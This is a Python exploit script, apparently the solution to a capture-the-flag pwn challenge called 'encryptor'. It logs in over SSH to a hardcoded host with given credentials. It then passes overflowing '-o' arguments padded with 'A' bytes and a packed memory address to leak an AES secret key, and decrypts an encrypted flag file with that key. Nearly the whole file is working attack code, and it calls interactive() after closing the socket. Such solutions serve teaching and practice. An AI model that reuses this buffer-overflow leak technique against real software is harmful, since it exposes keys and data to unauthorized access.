import os
from ptrlib import *
from Crypto.Cipher import AES

HOST = os.getenv('HOST', '153.125.128.105')
PORT = os.getenv('PORT', '9022')

sock = SSH(
    host=HOST, port=int(PORT),
    username='pwn', password='encryptor'
)

# Leak secret key
payload = [None, None, None]
for i in range(3):
    payload[i]  = b'A' * (0x22a - i)
    payload[i] += p64(0x602260)
    payload[i] = bytes2str(payload[i].strip(b'\x00'))

cmd  = "encryptor "
cmd += "-o " + repr(payload[0]) + " "
cmd += "-o " + repr(payload[1]) + " "
cmd += "-o " + repr(payload[2]) + " "
cmd += "-x 2>&1 | xxd -ps"
sock.sendlineafter("$ ", cmd)

sock.recvline()
secret = bytes.fromhex(sock.recvonce(16*2).decode())
logger.info(b"secret = " + secret)
sock.close()

# Decrypt
with open("../files/flag.enc", "rb") as f:
    cipher = f.read()
    aes = AES.new(secret, AES.MODE_ECB)
    print(aes.decrypt(cipher).decode())

sock.interactive()
